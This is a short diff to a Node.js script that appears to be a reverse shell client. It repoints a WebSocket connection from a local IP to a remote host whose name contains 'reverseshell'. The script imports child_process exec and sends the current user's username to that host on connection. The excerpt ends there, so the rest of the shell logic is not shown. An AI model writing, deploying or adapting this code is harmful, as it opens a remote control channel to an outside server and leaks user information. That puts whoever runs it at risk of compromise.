@@ -1,7 +1,7 @@
 const { exec } = require('child_process');
 var WebSocket = require('ws');
-var ws = new WebSocket('ws://192.168.0.240:8080');
-//var ws = new WebSocket('wss://reverseshell-ondrejdostal007.b4a.run/');
+//var ws = new WebSocket('ws://192.168.0.240:8080');
+var ws = new WebSocket('wss://reverseshell-ondrejdostal007.b4a.run/');
 ws.on('open', () => {
     console.log("> Websocket connection established.")
     ws.send(JSON.stringify({ type: "id", value: require("os").userInfo().username }))
